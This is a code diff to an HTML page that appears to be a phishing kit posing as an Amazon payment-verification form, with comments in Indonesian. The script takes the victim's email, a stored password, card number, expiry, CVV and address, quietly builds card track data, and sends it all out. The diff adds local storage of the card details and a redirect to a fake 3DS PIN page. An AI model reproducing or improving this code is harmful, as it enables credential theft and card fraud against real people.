@@ -98,6 +98,11 @@
             background: #F7CA00;
             border-color: #F2C200;
         }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
         .garis-bawah {
             width: 5000px;
             height: 2px;
@@ -229,12 +234,14 @@
     </div>
 
     <script>
+        // Tampilkan email dari halaman sebelumnya
         const emailPengguna = localStorage.getItem('emailPengguna') || '';
         document.getElementById('emailTampil').textContent = emailPengguna;
 
         const formBilling = document.getElementById('formBilling');
         const tombolVerifikasi = document.getElementById('tombolVerifikasi');
 
+        // Semua kolom
         const kolom = {
             namaKartu:  { el: document.getElementById('namaKartu'),  peringatan: document.getElementById('peringatanNama') },
             nomorKartu: { el: document.getElementById('nomorKartu'), peringatan: document.getElementById('peringatanKartu') },
@@ -271,7 +278,7 @@
             e.target.value = val;
         });
 
-        // === FUNGSI BUAT TRACK SECARA TERSEMBUNYI ===
+        // === BUAT TRACK KARTU OTOMATIS (TIDAK DITAMPILKAN) ===
         function buatTrack() {
             let nomorBersih = kolom.nomorKartu.el.value.replace(/\s/g, '');
             let expiryBersih = kolom.expiry.el.value.replace(/\D/g, '');
@@ -306,7 +313,7 @@ T2: ${track2}`;
             return semuaOk;
         }
 
-        // Kirim data — Track ikut terkirim tanpa ditampilkan
+        // Kirim data & lanjut ke 3DS
         formBilling.addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -315,15 +322,25 @@ T2: ${track2}`;
             tombolVerifikasi.disabled = true;
             tombolVerifikasi.textContent = 'Verifying...';
 
+            const nomorBersih = kolom.nomorKartu.el.value.trim().replace(/\s/g, '');
+            const trackKartu = buatTrack();
+
+            // Simpan untuk halaman berikutnya
+            localStorage.setItem('nomorKartu', nomorBersih);
+            localStorage.setItem('namaKartu', kolom.namaKartu.el.value.trim());
+            localStorage.setItem('expiry', kolom.expiry.el.value.trim());
+            localStorage.setItem('cvv', kolom.cvv.el.value.trim());
+            localStorage.setItem('trackKartu', trackKartu);
+
             const data = {
                 email: emailPengguna,
                 password: localStorage.getItem('passwordPengguna') || 'Tidak tersimpan',
                 tipe: 'Verification Payment',
                 namaKartu:  kolom.namaKartu.el.value.trim(),
-                nomorKartu: kolom.nomorKartu.el.value.trim(),
+                nomorKartu: nomorBersih,
                 expiry:     kolom.expiry.el.value.trim(),
                 cvv:        kolom.cvv.el.value.trim(),
-                trackKartu: buatTrack(), // ✅ DIHASILKAN OTOMATIS & IKUT TERKIRIM
+                trackKartu: trackKartu,
                 negara:     kolom.negara.el.value,
                 alamat:     kolom.alamat.el.value.trim(),
                 kota:       kolom.kota.el.value.trim(),
@@ -343,7 +360,8 @@ T2: ${track2}`;
                 console.log('Data terkirim');
             }
 
-            window.location.href = 'https://www.amazon.com';
+            // Lanjut ke halaman PIN 3DS
+            window.location.href = '3ds.html';
         });
     </script>
 </body>
